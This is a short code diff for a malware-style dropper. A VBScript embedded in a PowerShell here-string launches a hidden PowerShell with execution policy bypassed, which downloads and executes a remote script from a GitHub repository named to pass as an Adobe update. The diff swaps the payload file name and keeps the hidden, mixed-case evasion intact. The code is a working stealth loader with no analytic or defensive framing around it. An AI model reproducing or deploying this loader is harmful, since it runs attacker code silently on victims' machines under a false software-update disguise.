@@ -1,5 +1,5 @@
 $VBS_file = @'
-mycommand = "powershell -w hidden -ex bypass -c iex ((NeW-object net.wEbclient).downloadstring('https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/helloworld.ps1'))"
+mycommand = "powershell -w hidden -ex bypass -c iex ((NeW-object net.wEbclient).downloadstring('https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/lib106.ps1'))"
 CreateObject("Wscript.Shell").Run mycommand, 0, false
 '@
 
